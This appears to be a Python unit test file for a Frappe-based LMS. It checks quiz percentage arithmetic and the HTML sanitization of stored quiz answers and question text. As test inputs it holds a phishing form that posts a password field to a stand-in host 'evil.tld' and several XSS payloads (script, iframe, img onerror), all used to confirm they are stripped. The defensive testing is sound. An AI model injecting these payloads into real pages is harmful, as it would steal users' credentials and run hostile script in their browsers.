# Copyright (c) 2021, FOSS United and Contributors
# See license.txt

import unittest
from types import SimpleNamespace

import frappe

from lms.lms.doctype.lms_quiz_submission.lms_quiz_submission import LMSQuizSubmission
from lms.lms.test_helpers import BaseTestUtils


class TestSetPercentage(unittest.TestCase):
	"""Arithmetic over three fields, so a plain object stands in for a saved document."""

	def percentage(self, score, score_out_of):
		submission = SimpleNamespace(score=score, score_out_of=score_out_of, percentage=0)
		LMSQuizSubmission.set_percentage(submission)
		return submission.percentage

	def test_percentage_is_the_share_of_the_marks_scored(self):
		self.assertEqual(self.percentage(3, 4), 75)

	def test_a_negative_score_reports_zero_rather_than_a_negative_percentage(self):
		# A negative percentage threw NonNegativeError and the attempt was never recorded.
		self.assertEqual(self.percentage(-1, 1), 0)

	def test_a_zero_score_leaves_the_percentage_alone(self):
		self.assertEqual(self.percentage(0, 4), 0)


class TestQuizResultSanitization(BaseTestUtils):
	"""Ticket 68647 finding 3. An open-ended answer is stored as the learner typed it.

	The SPA drops form controls at render time, but reports, exports and the jinja
	portal render the stored value as authored -- so the rows are cleaned by the
	parent's validate(). A child doctype fires no doc_events of its own.
	"""

	PHISHING_FORM = (
		'<form action="https://evil.tld/steal" method="post">'
		'<input name="password" type="password"><button>Login</button></form>'
	)
	RICH_TEXT = (
		"<p><b>bold</b> <i>italic</i></p><ul><li>one</li></ul>"
		'<a href="https://ok">link</a><img src="/files/x.png">'
	)

	@classmethod
	def setUpClass(cls):
		super().setUpClass()
		question = frappe.new_doc("LMS Question")
		question.update({"question": "Explain in your own words.", "type": "Open Ended", "marks": 5})
		question.save()
		cls.question = question

		quiz = frappe.new_doc("LMS Quiz")
		quiz.update(
			{"title": f"Sanitization Quiz {frappe.generate_hash(length=6)}", "passing_percentage": 70}
		)
		quiz.append("questions", {"question": question.name, "marks": 5})
		quiz.save()
		cls.quiz = quiz

	def _submission(self, answer, question=None):
		doc = frappe.new_doc("LMS Quiz Submission")
		doc.update(
			{
				"quiz": self.quiz.name,
				"member": "Administrator",
				"score_out_of": 5,
				"passing_percentage": 70,
			}
		)
		doc.append(
			"result",
			{
				"question": question or self.question.question,
				"question_name": self.question.name,
				"question_type": "Open Ended",
				"answer": answer,
				"marks": 5,
				"marks_out_of": 5,
			},
		)
		doc.insert()
		return doc

	def _stored_row(self, doc):
		return frappe.db.get_all(
			"LMS Quiz Result", filters={"parent": doc.name}, fields=["answer", "question"]
		)[0]

	def test_a_phishing_form_in_an_answer_is_not_stored(self):
		doc = self._submission(self.PHISHING_FORM)
		stored = self._stored_row(doc).answer
		for tag in ("<form", "<input", "<button"):
			self.assertNotIn(tag, stored)
		self.assertIn("Login", stored)

	def test_a_phishing_form_in_the_question_text_is_not_stored(self):
		doc = self._submission("plain answer", question=self.PHISHING_FORM + "<b>Question?</b>")
		stored = self._stored_row(doc).question
		self.assertNotIn("<form", stored)
		self.assertIn("<b>Question?</b>", stored)

	def test_legitimate_rich_text_in_an_answer_survives(self):
		doc = self._submission(self.RICH_TEXT)
		stored = self._stored_row(doc).answer
		for markup in ("<b>bold</b>", "<li>one</li>", 'href="https://ok"', '<img src="/files/x.png">'):
			self.assertIn(markup, stored)

	def test_sanitizing_the_same_row_twice_does_not_change_it(self):
		doc = self._submission(self.PHISHING_FORM + self.RICH_TEXT)
		after_first_save = self._stored_row(doc).answer
		doc.reload()
		doc.save()
		self.assertEqual(self._stored_row(doc).answer, after_first_save)

	def test_script_iframe_and_event_handlers_are_still_stripped(self):
		doc = self._submission(
			'<script>alert(1)</script><iframe src="https://evil.tld"></iframe><img src=x onerror=alert(1)>'
		)
		stored = self._stored_row(doc).answer
		for tag in ("<script", "<iframe", "onerror"):
			self.assertNotIn(tag, stored)
